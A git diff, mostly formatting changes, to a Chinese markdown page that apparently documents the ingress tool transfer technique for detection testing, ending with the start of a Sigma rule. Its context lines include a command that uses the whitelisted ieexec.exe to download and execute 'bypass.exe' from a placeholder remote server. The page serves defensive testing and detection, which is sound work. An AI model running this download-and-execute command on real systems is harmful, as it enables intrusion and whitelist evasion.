@@ -5,17 +5,19 @@
 攻击者可能会将工具或其他文件从外部系统转移到被攻击的环境中。可以通过命令和控制通道从外部攻击者控制的系统复制文件，用以将工具带入被攻击的网络中，或通过其他工具（如 FTP）的替代协议。 也可以使用 scp、rsync 和 sftp等本地工具在Mac和 Linux上复制文件。
 
 ## 测试案例
+
 IEexec.exe应用程序是.NET Framework附带程序，存在于多个系统白名单内。可以将IEExec.exe应用程序用作主机，以运行使用URL启动的其他托管应用程序。
 
 **路径:**
-```
+
+```yml
 -   C:\Windows\Microsoft.NET\Framework\v2.0.50727\ieexec.exe
 -   C:\Windows\Microsoft.NET\Framework64\v2.0.50727\ieexec.exe
 ```
 
 从远程服务器下载并执行 bypass.exe。  
 
-```
+```yml
 ieexec.exe http://x.x.x.x:8080/bypass.exe
 ```
 
@@ -41,7 +43,9 @@ C:\Users\liyang>C:\Windows\Microsoft.NET\Framework\v2.0.50727\ieexec.exe http://
 ```
 
 在Windows10环境下直接执行ieexec.exe提示异常，需要指定具体路径后才可以正常执行该命令。可将文中的QQ.exe替换成bypass文件即可。
+
 ## 测试留痕
+
 ```yml
 已创建新进程。
 
@@ -89,7 +93,9 @@ C:\Users\liyang>C:\Windows\Microsoft.NET\Framework\v2.0.50727\ieexec.exe http://
 ```
 
 ## 检测方法/思路
+
 ### Sigma规则
+
 ```yml
 title: ieexec.exe bypass
 status: experimental
